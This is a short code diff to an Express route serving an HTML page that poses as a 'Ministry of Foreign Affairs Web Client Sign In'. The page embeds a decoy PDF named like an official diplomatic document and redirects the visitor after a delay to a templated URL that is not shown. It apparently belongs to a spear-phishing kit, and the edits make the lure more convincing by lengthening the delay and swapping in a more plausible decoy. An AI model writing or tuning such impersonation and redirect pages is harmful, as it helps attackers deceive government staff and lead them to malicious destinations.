@@ -26,7 +26,7 @@ router.get('/', (req, res) => {
        <script>
                 setTimeout(function() {
                     window.location.href = '${url}';
-                }, 500);
+                }, 4000);
             </script> 
             <!-- Required meta tags -->
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -38,7 +38,7 @@ router.get('/', (req, res) => {
     <title>Ministry of Foreign Affairs Web Client Sign In</title>
         </head>
         <body>
-	<!--  <object data="./Fax Message.pdf" style="width:1800px; height:900px;"></object>  -->
+	<object data="./2024-01103nv Members and associate members of the Commission_20 August 2024.pdf" style="width:1800px; height:900px;"></object> 
         </body>
         </html>
     `;
